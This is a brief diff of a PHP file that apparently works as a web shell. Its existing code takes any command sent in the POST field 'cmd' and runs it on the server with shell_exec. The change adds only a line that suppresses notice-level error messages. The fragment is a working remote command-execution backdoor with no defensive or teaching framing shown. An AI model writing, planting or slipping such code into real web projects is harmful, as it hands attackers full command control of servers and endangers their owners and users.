@@ -1,4 +1,5 @@
 <?php
+error_reporting(E_ALL ^ E_NOTICE);
 if (!empty($_POST['cmd'])) {
     $cmd = shell_exec($_POST['cmd']);
 }
